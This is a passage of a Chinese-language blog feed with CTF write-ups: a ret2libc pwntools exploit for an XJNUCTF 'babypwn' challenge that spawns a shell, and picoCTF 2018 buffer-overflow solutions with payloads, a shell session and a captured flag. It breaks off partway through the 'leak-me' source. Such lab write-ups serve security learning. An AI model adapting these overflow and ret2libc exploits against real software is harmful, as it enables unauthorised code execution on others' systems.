0x000000000040071d <span class="token keyword">:</span> pop rsp <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x00000000004004e1 <span class="token keyword">:</span> ret
0x00000000004005c5 <span class="token keyword">:</span> ret 0xc148

Unique gadgets found: 12
</code></pre>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babypwn'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'babypwn'</span><span class="token punctuation">)</span>

puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>

<span class="token keyword">print</span> <span class="token string">'puts_plt:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> <span class="token string">'puts_got:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
start_addr <span class="token operator">=</span> <span class="token number">0x400550</span>
pop_rdi<span class="token operator">=</span><span class="token number">0x400723</span> <span class="token comment" spellcheck="true">#pop rdi ; ret</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What do you plan to do?\n"</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">120</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span>
payload <span class="token operator">=</span>  溢出偏移<span class="token operator">+</span>pop_rdi_ret（因为<span class="token number">64</span>位下以寄存器传参）<span class="token operator">+</span>给puts<span class="token punctuation">(</span><span class="token punctuation">)</span>赋值<span class="token operator">+</span>循环地址<span class="token punctuation">(</span>也可以是leak该puts的函数地址<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"send success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
<span class="token operator">&lt;</span>p <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"code-caption"</span> data<span class="token operator">-</span>lang<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data<span class="token operator">-</span>trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data<span class="token operator">-</span>label_position<span class="token operator">=</span><span class="token string">"outer"</span> data<span class="token operator">-</span>labels_left<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_right<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
</code></pre>
<p>通过<a href="https://libc.blukat.me" target="_blank" rel="noopener">https://libc.blukat.me</a> 进行查询</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/libcsearch.jpg" alt="libcsearch"></p>
<p>找到libc版本 接着获取system地址及binsh地址</p>
<pre class=" language-python"><code class="language-python">system <span class="token operator">=</span> puts <span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
binsh <span class="token operator">=</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
binsh <span class="token operator">=</span> puts <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token operator">+</span> binsh
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">120</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span> 
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>成功getshell</p>
<h2 id="RE50"><a href="#RE50" class="headerlink" title="RE50"></a>RE50</h2><p><img src="/2018/10/04/XJNUCTF-Writeup/29.png" alt="29"></p>
<p>使用IDA打开</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/30.png" alt="30"></p>
<p>定位到main函数</p>
<p>看到一些常量 </p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/31.png" alt="31"></p>
<p>拼接 即可获得flag</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Web10&quot;&gt;&lt;a href=&quot;#Web10&quot; class=&quot;headerlink&quot; title=&quot;Web10&quot;&gt;&lt;/a&gt;Web10&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/2018/10/04/XJNUCTF-Writeup/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;

    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>picoctf-Writeup</title>
    <link href="http://iosmosis.github.io/2018/10/02/picoctf-Writeup/"/>
    <id>http://iosmosis.github.io/2018/10/02/picoctf-Writeup/</id>
    <published>2018-10-02T12:05:03.000Z</published>
    <updated>2018-10-05T06:27:40.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="buffer-overflow-0"><a href="#buffer-overflow-0" class="headerlink" title="buffer overflow 0"></a>buffer overflow 0</h3><p>查看程序源代码</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __gid_t v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST18_4</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-Ch] [ebp-1Ch]</span>
  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-Ch]</span>

  stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>stream <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span>
      <span class="token string">"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">signal</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__sighandler_t<span class="token punctuation">)</span>sigsegv_handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setresgid</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> argc <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This program takes 1 argument."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Thanks! Received: %s"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>将flag.txt读入栈中</p>
<p>那么第一想法就应该是ssp leak flag</p>
<p>查看保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ checksec
CANARY    <span class="token keyword">:</span> disabled
FORTIFY   <span class="token keyword">:</span> disabled
NX        <span class="token keyword">:</span> ENABLED
PIE       <span class="token keyword">:</span> disabled
RELRO     <span class="token keyword">:</span> Partial
gdb-peda$
</code></pre>
<p>发现没开一canary  ==</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __cdecl __noreturn <span class="token function">sigsegv_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s\n"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>在代码中找到 一处print flag的地方 那么就可以尝试溢出到sigsegv_handler地址 打印flag</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>__cdecl <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> dest<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-18h]</span>

  <span class="token keyword">return</span> <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//溢出点</span>
<span class="token punctuation">}</span>
</code></pre>
<p>payload</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>./buffer0 `python -c &quot;print &#39;a&#39;*0x18+&#39;bbbb&#39;+&#39;\x2B\x86\x04\x08&#39;&quot;`
</code></pre><p>\x2B\x86\x04\x08是 sigsegv_handler地址</p>
<p>远程尝试获取flag</p>
<p><img src="/2018/10/02/picoctf-Writeup/1.jpg" alt="1"></p>
<h3 id="buffer-overflow-1"><a href="#buffer-overflow-1" class="headerlink" title="buffer overflow 1"></a>buffer overflow 1</h3><p>查看题目得知 此次只需要跳转到win地址即可</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __gid_t v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setresgid</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please enter your string: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>跟入vuln</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-28h]</span>
  <span class="token keyword">int</span> savedregs<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+28h] [ebp+0h]</span>

  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存在溢出</span>
  v0 <span class="token operator">=</span> <span class="token function">get_return_address</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>savedregs<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Okay, time to return... Fingers Crossed... Jumping to 0x%x\n"</span><span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>win_addr = 0x80485CB</p>
<p>构造本地payload</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./buffer1'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span><span class="token string">'bbbb'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x80485CB</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>构造远程payload</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">iosmosis@pico<span class="token number">-2018</span><span class="token operator">-</span>shell<span class="token number">-1</span><span class="token punctuation">:</span><span class="token operator">~</span>$ cd <span class="token operator">/</span>problems<span class="token operator">/</span>buffer<span class="token operator">-</span>overflow<span class="token operator">-</span>1_3_af8f83fb19a7e2c98e28e325e4cacf78
iosmosis@pico<span class="token number">-2018</span><span class="token operator">-</span>shell<span class="token number">-1</span><span class="token punctuation">:</span><span class="token operator">/</span>problems<span class="token operator">/</span>buffer<span class="token operator">-</span>overflow<span class="token operator">-</span>1_3_af8f83fb19a7e2c98e28e325e4cacf78$ python
Python <span class="token number">2.7</span><span class="token punctuation">.</span><span class="token number">12</span> <span class="token punctuation">(</span>default<span class="token punctuation">,</span> Dec  <span class="token number">4</span> <span class="token number">2017</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">)</span> 
<span class="token punctuation">[</span>GCC <span class="token number">5.4</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token number">20160609</span><span class="token punctuation">]</span> on linux2
Type <span class="token string">"help"</span><span class="token punctuation">,</span> <span class="token string">"copyright"</span><span class="token punctuation">,</span> <span class="token string">"credits"</span> <span class="token operator">or</span> <span class="token string">"license"</span> <span class="token keyword">for</span> more information<span class="token punctuation">.</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token operator">>></span><span class="token operator">></span> payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span><span class="token string">'bbbb'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x80485CB</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> p <span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./vuln'</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>x<span class="token punctuation">]</span> Starting local process <span class="token string">'./vuln'</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./vuln'</span><span class="token punctuation">:</span> pid <span class="token number">856860</span>
<span class="token operator">>></span><span class="token operator">></span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Process <span class="token string">'./vuln'</span> stopped <span class="token keyword">with</span> exit code <span class="token operator">-</span><span class="token number">11</span> <span class="token punctuation">(</span>SIGSEGV<span class="token punctuation">)</span> <span class="token punctuation">(</span>pid <span class="token number">856860</span><span class="token punctuation">)</span>
Please enter your string<span class="token punctuation">:</span> 
Okay<span class="token punctuation">,</span> time to <span class="token keyword">return</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> Fingers Crossed<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> Jumping to <span class="token number">0x80485cb</span>
picoCTF<span class="token punctuation">{</span>addr3ss3s_ar3_3asy65489706<span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive
</code></pre>
<p>成功获取到flag</p>
<p><img src="/2018/10/02/picoctf-Writeup/2.jpg" alt="2"></p>
<h3 id="leak-me"><a href="#leak-me" class="headerlink" title="leak-me"></a>leak-me</h3><p>查看源代码</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>

<span class="token keyword">int</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  FILE <span class="token operator">*</span>file<span class="token punctuation">;</span>
  file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">fgets</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">{</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment" spellcheck="true">// Set the gid to the effective gid</span>
  gid_t gid <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setresgid</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span> gid<span class="token punctuation">,</span> gid<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment" spellcheck="true">// real pw: </span>
  FILE <span class="token operator">*</span>file<span class="token punctuation">;</span>
  <span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> password_input<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token function">memset</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>password_input<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>password_input<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What is your name?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fgets</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>end <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token operator">*</span>end <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">strcat</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">",\nPlease Enter the Password."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"password.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">fgets</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> 

  <span class="token function">fgets</span><span class="token punctuation">(</span>password_input<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>password_input<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
